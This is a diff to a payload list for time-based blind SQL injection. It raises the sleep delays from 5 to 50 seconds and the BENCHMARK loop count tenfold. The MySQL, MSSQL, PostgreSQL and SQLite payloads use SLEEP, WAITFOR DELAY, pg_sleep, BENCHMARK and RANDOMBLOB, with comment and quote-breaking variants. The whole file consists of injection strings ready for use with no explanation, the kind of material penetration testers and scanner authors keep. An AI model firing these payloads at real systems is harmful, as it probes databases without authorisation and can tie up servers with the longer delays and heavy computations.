@@ -1,47 +1,47 @@
- AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
- AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
- AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
- AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
- AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
-SLEEP(5)#
-SLEEP(5)-- 
-SLEEP(5)="
-SLEEP(5)='
- or SLEEP(5)
- or SLEEP(5)#
- or SLEEP(5)--
- or SLEEP(5)="
- or SLEEP(5)='
-waitfor delay '00:00:05'
-waitfor delay '00:00:05'-- 
-waitfor delay '00:00:05'#
-benchmark(50000000,MD5(1))
-benchmark(50000000,MD5(1))-- 
-benchmark(50000000,MD5(1))#
- or benchmark(50000000,MD5(1))
- or benchmark(50000000,MD5(1))-- 
- or benchmark(50000000,MD5(1))#
-pg_SLEEP(5)
-pg_SLEEP(5)-- 
-pg_SLEEP(5)#
- or pg_SLEEP(5)
- or pg_SLEEP(5)-- 
- or pg_SLEEP(5)#
+ AND (SELECT * FROM (SELECT(SLEEP(50)))bAKL) AND 'vRxe'='vRxe
+ AND (SELECT * FROM (SELECT(SLEEP(50)))YjoC) AND '%'='
+ AND (SELECT * FROM (SELECT(SLEEP(50)))nQIP)
+ AND (SELECT * FROM (SELECT(SLEEP(50)))nQIP)--
+ AND (SELECT * FROM (SELECT(SLEEP(50)))nQIP)#
+SLEEP(50)#
+SLEEP(50)-- 
+SLEEP(50)="
+SLEEP(50)='
+ or SLEEP(50)
+ or SLEEP(50)#
+ or SLEEP(50)--
+ or SLEEP(50)="
+ or SLEEP(50)='
+waitfor delay '00:00:50'
+waitfor delay '00:00:50'-- 
+waitfor delay '00:00:50'#
+benchmark(500000000,MD5(1))
+benchmark(500000000,MD5(1))-- 
+benchmark(500000000,MD5(1))#
+ or benchmark(500000000,MD5(1))
+ or benchmark(500000000,MD5(1))-- 
+ or benchmark(500000000,MD5(1))#
+pg_SLEEP(50)
+pg_SLEEP(50)-- 
+pg_SLEEP(50)#
+ or pg_SLEEP(50)
+ or pg_SLEEP(50)-- 
+ or pg_SLEEP(50)#
 '\"
- AnD SLEEP(5)
- AnD SLEEP(5)--
- AnD SLEEP(5)#
-&&SLEEP(5)
-&&SLEEP(5)--
-&&SLEEP(5)#
-' AnD SLEEP(5) ANd '1
-'&&SLEEP(5)&&'1
- ORDER BY SLEEP(5)
- ORDER BY SLEEP(5)-- 
- ORDER BY SLEEP(5)#
-(SELECT * FROM (SELECT(SLEEP(5)))ecMj)
-(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
-(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
+ AnD SLEEP(50)
+ AnD SLEEP(50)--
+ AnD SLEEP(50)#
+&&SLEEP(50)
+&&SLEEP(50)--
+&&SLEEP(50)#
+' AnD SLEEP(50) ANd '1
+'&&SLEEP(50)&&'1
+ ORDER BY SLEEP(50)
+ ORDER BY SLEEP(50)-- 
+ ORDER BY SLEEP(50)#
+(SELECT * FROM (SELECT(SLEEP(50)))ecMj)
+(SELECT * FROM (SELECT(SLEEP(50)))ecMj)#
+(SELECT * FROM (SELECT(SLEEP(50)))ecMj)--
 +benchmark(3200,SHA1(1))+'
  + SLEEP(10) + '
  RANDOMBLOB(500000000/2)
@@ -50,4 +50,4 @@ pg_SLEEP(5)#
  RANDOMBLOB(1000000000/2)
  AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
  OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
- SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
+ SLEEP(10)/*' or SLEEP(10) or '" or SLEEP(10) or "*/
